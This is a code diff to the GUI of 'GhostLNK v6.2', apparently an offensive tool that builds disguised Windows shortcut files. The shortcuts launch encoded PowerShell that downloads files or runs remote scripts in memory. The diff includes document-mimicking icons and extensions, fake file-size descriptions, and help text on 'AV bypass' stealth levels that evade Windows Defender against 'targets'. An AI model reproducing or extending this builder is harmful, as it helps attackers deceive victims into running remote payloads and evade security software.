             conflicts.append("no debug")
         if not self.hide_pwsh_cb.isEnabled():
             conflicts.append("no hide")
-        
+
         if conflicts:
             self.mode_indicator.setText(f"Current Mode: {current_mode} ({', '.join(conflicts)})")
             self.mode_indicator.setStyleSheet("color: #ffaa00; font-weight: bold;")
         else:
             self.mode_indicator.setText(f"Current Mode: {current_mode}")
             self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
-    
+
     def on_stealth_changed(self):
         """Update stealth hint"""
         stealth = self.stealth_combo.currentIndex()
@@ -1145,17 +1150,17 @@ class GhostLNKGUI(QMainWindow):
             "Maximum: Obfuscated code, no suspicious flags, AV bypass attempt"
         ]
         self.stealth_hint.setText(hints[stealth])
-        
+
         stealth_names = ["None", "Moderate", "Maximum"]
         self.stealth_indicator.setText(f"Stealth: {stealth_names[stealth]}")
-        
+
         # Reset all visual states when stealth changes
         self.update_options()
-    
+
     def on_url_changed(self):
         """Handle URL changes"""
         url = self.url_input.text().strip()
-        
+
         # Check Dropbox
         if 'dropbox.com' in url.lower():
             if 'dl=1' not in url:
@@ -1166,13 +1171,13 @@ class GhostLNKGUI(QMainWindow):
                 self.dropbox_indicator.setStyleSheet("color: #66ff66;")
         else:
             self.dropbox_indicator.setText("")
-        
+
         # Auto-suggest payload type
         if url:
             guessed = PowerShellConverter.guess_payload_type(url)
             if guessed == "memory_execute" and '.ps1' in url.lower():
                 self.type_combo.setCurrentIndex(1)
-    
+
     def on_type_changed(self):
         """Update type hint and indicator"""
         types = [
@@ -1181,37 +1186,37 @@ class GhostLNKGUI(QMainWindow):
             "🕵️ Ultra Stealth: Minimal output, just executes."
         ]
         self.type_hint.setText(types[self.type_combo.currentIndex()])
-        
+
         mode_names = ["Download & Open", "Memory Execute", "Ultra Stealth"]
         self.mode_indicator.setText(f"Current Mode: {mode_names[self.type_combo.currentIndex()]}")
         self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
-        
+
         # Reset all visual states when mode changes
         self.update_options()
-    
+
     def get_payload(self):
         """Get the appropriate payload based on selected type"""
         url = self.url_input.text().strip()
         if not url:
             QMessageBox.warning(self, "Warning", "Please enter a URL first")
             return None
-        
+
         pause = self.pause_cb.isChecked()
         debug = self.debug_cb.isChecked()
         stealth = self.stealth_combo.currentIndex()
         mode = self.type_combo.currentIndex()
-        
+
         if mode == 0:
             return PowerShellConverter.create_download_and_open_payload(url, pause, debug, stealth)
         elif mode == 1:
             return PowerShellConverter.create_memory_execute_payload(url, pause, debug, stealth)
         else:
             return PowerShellConverter.create_stealth_payload(url, pause, debug, stealth)
-    
+
     def load_url(self, url):
         self.url_input.setText(url)
         self.log(f"Loaded: {url[:50]}...")
-    
+
     def show_command(self):
         payload = self.get_payload()
         if payload:
@@ -1219,7 +1224,7 @@ class GhostLNKGUI(QMainWindow):
             mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
             stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
             self.log(f"[✓] Command generated - Mode: {mode}, Stealth: {stealth}")
-            
+
             # Update progress indicators
             self.step1_indicator.setText("✅ Step 1")
             self.step1_indicator.setStyleSheet("color: #88ff88;")
@@ -1229,7 +1234,7 @@ class GhostLNKGUI(QMainWindow):
             self.step3_indicator.setStyleSheet("color: #666666;")
             self.step4_indicator.setText("⚪ Step 4")
             self.step4_indicator.setStyleSheet("color: #666666;")
-    
+
     def encode(self):
         payload = self.get_payload()
         if payload:
@@ -1237,11 +1242,11 @@ class GhostLNKGUI(QMainWindow):
             encoded = base64.b64encode(payload.encode('utf-16le')).decode()
             full_arg = f"-E {encoded}"
             self.arg_display.setText(full_arg)
-            
+
             mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
             stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
             self.log(f"[✓] Encoded - Mode: {mode}, Stealth: {stealth} | Length: {len(encoded)} chars")
-            
+
             # Update progress indicators
             self.step1_indicator.setText("✅ Step 1")
             self.step1_indicator.setStyleSheet("color: #88ff88;")
@@ -1251,14 +1256,14 @@ class GhostLNKGUI(QMainWindow):
             self.step3_indicator.setStyleSheet("color: #666666;")
             self.step4_indicator.setText("⚪ Step 4")
             self.step4_indicator.setStyleSheet("color: #666666;")
-    
+
     def copy_arg(self):
         arg = self.arg_display.toPlainText().strip()
         if arg:
             QApplication.clipboard().setText(arg)
             self.import_input.setText(arg)
             self.log("[✓] Copied to clipboard")
-            
+
             # Update progress indicators
             self.step1_indicator.setText("✅ Step 1")
             self.step1_indicator.setStyleSheet("color: #88ff88;")
@@ -1268,14 +1273,14 @@ class GhostLNKGUI(QMainWindow):
             self.step3_indicator.setStyleSheet("color: #88ff88;")
             self.step4_indicator.setText("⚪ Step 4")
             self.step4_indicator.setStyleSheet("color: #666666;")
-    
+
     def use_in_lnk(self):
         arg = self.arg_display.toPlainText().strip()
         if arg:
             self.import_input.setText(arg)
             self.preview_label.setText(f"Arguments: {arg[:100]}...")
             self.log("[✓] Loaded into LNK generator")
-            
+
             # Update progress indicators
             self.step1_indicator.setText("✅ Step 1")
             self.step1_indicator.setStyleSheet("color: #88ff88;")
@@ -1285,18 +1290,24 @@ class GhostLNKGUI(QMainWindow):
             self.step3_indicator.setStyleSheet("color: #88ff88;")
             self.step4_indicator.setText("✅ Step 4")
             self.step4_indicator.setStyleSheet("color: #88ff88;")
-    
+
     def import_arg(self):
         arg = self.import_input.text().strip()
         if arg:
+            # Add -E prefix if missing
+            if not arg.startswith("-E "):
+                arg = f"-E {arg}"
+            self.import_input.setText(arg)  # Update input with corrected arg
             self.preview_label.setText(f"Arguments: {arg[:100]}...")
             self.log("[✓] Imported argument")
-    
+        else:
+            QMessageBox.warning(self, "Warning", "Please paste a base64 string first.")
+
     def generate_desc(self):
         date = datetime.now().strftime("%d/%m/%Y")
         icon = self.icon_combo.currentText()
         self.desc_input.setText(f"Type: {icon}\nSize: 1.23 MB\nDate modified: {date}")
-    
+
     def log(self, msg):
         timestamp = datetime.now().strftime("%H:%M:%S")
         self.console.append(f"[{timestamp}] {msg}")
@@ -1304,39 +1315,39 @@ class GhostLNKGUI(QMainWindow):
         cursor.movePosition(cursor.MoveOperation.End)
         self.console.setTextCursor(cursor)
         QApplication.processEvents()
-    
+
     def generate_lnk(self):
         try:
             arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
             if not arg:
                 QMessageBox.warning(self, "Warning", "No -E argument set")
                 return
-            
+
             icon = self.icon_combo.currentText()
             icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
-            
+
             name = self.filename_input.text().strip() or "Document"
             ext_choice = self.ext_combo.currentText()
             filename = f"{name}{ext_choice}"
             if self.lnk_cb.isChecked():
                 filename += ".lnk"
-            
+
             desc = self.desc_input.toPlainText().strip()
             if not desc:
                 self.generate_desc()
                 desc = self.desc_input.toPlainText().strip()
-            
+
             save_path, _ = QFileDialog.getSaveFileName(self, "Save LNK File", filename, "LNK Files (*.lnk)")
             if not save_path:
                 return
-            
+
             mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
             stealth = self.stealth_combo.currentIndex()
             stealth_names = ["Normal", "Moderate", "Maximum"]
             hide = self.hide_pwsh_cb.isChecked()
-            
+
             self.log(f"👻 Generating LNK ({mode}, Stealth: {stealth_names[stealth]}, Hide PowerShell: {hide})...")
-            
+
             LNKEngine.create_lnk(
                 save_path,
                 r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
@@ -1347,94 +1358,94 @@ class GhostLNKGUI(QMainWindow):
                 stealth_level=stealth,
                 hide_powershell=hide
             )
-            
+
             size = os.path.getsize(save_path)
             self.log(f"[✓] LNK saved: {os.path.basename(save_path)} ({size} bytes) - Stealth: {stealth_names[stealth]}, Hide: {hide}")
-            
-            QMessageBox.information(self, "Success", 
+
+            QMessageBox.information(self, "Success",
                 f"LNK file generated successfully!\n\n"
                 f"Path: {save_path}\n"
                 f"Mode: {mode}\n"
                 f"Stealth: {stealth_names[stealth]}\n"
                 f"PowerShell Hidden: {hide}")
-            
+
         except Exception as e:
             self.log(f"❌ Error: {str(e)}")
             QMessageBox.critical(self, "Error", str(e))
-    
+
     def show_mode_guide(self):
         QMessageBox.about(self, "Payload Mode Guide",
             "<b>📁 Download & Open Mode</b><br>"
             "- Saves file to temp folder<br>"
             "- Opens with default application<br>"
             "- Use for: PDFs, images, documents<br><br>"
-            
+
             "<b>⚡ Memory Execute Mode</b><br>"
             "- Downloads and runs PowerShell script in memory<br>"
             "- No files saved to disk<br>"
             "- Use for: .ps1 script files ONLY<br><br>"
-            
+
             "<b>🕵️ Ultra Stealth Mode</b><br>"
             "- Minimal output<br>"
             "- Just executes<br>"
             "- Good for background scripts")
-    
+
     def show_stealth_help(self):
         QMessageBox.about(self, "Stealth Mode Guide",
             "<b>👻 Stealth Levels Explained</b><br><br>"
-            
+
             "<b>Level 0 - Normal:</b><br>"
             "- Standard PowerShell commands<br>"
             "- Visible window with output<br>"
             "- May trigger AV detection<br><br>"
-            
+
             "<b>Level 1 - Moderate Stealth:</b><br>"
             "- Uses aliases (iex instead of Invoke-Expression)<br>"
             "- Avoids obvious patterns<br>"
             "- Minimal output<br>"
             "- Better chance of bypassing AV<br><br>"
-            
+
             "<b>Level 2 - Maximum Stealth (AV Bypass):</b><br>"
             "- Uses obfuscated variable names<br>"
             "- Avoids -WindowStyle Hidden flag<br>"
             "- Uses Start instead of Start-Process<br>"
             "- No comments or unnecessary code<br>"
             "- Best chance of evading detection<br><br>"
-            
+
             "<b>Why the detection happened:</b><br>"
             "- Windows Defender flagged '-WindowStyle Hidden'<br>"
             "- Long encoded commands are suspicious<br>"
             "- Multiple PowerShell flags together<br><br>"
-            
+
             "<b>Maximum Stealth avoids:</b><br>"
             "- No -WindowStyle Hidden flag<br>"
             "- Shorter, obfuscated commands<br>"
             "- No debug output<br>"
             "- Uses aliases instead of full cmdlets")
-    
+
     def show_hide_help(self):
         QMessageBox.about(self, "Hidden PowerShell Window Guide",
             "<b>🔒 Hidden PowerShell Window Feature</b><br><br>"
-            
+
             "<b>What it does:</b><br>"
             "- Adds '-WindowStyle Hidden' to PowerShell arguments<br>"
             "- Runs PowerShell completely invisibly<br>"
             "- No console window appears at all<br><br>"
-            
+
             "<b>⚠️ Important Notes:</b><br>"
             "- This flag is <b>well-known to AV</b> (Windows Defender, etc.)<br>"
             "- May trigger detection in security-conscious environments<br>"
             "- For MAXIMUM STEALTH, use Level 2 instead (window minimized, not hidden)<br><br>"
-            
+
             "<b>When to use:</b><br>"
             "- Lab environments / testing<br>"
             "- Targets without AV<br>"
             "- When you want zero visibility at all costs<br><br>"
-            
+
             "<b>When NOT to use:</b><br>"
             "- With Maximum Stealth (Level 2) - conflicts with AV bypass<br>"
             "- In high-security environments with aggressive AV")
-    
+
     def show_about(self):
         QMessageBox.about(self, "About GhostLNK",
             "<b>GhostLNK v6.2</b><br><br>"
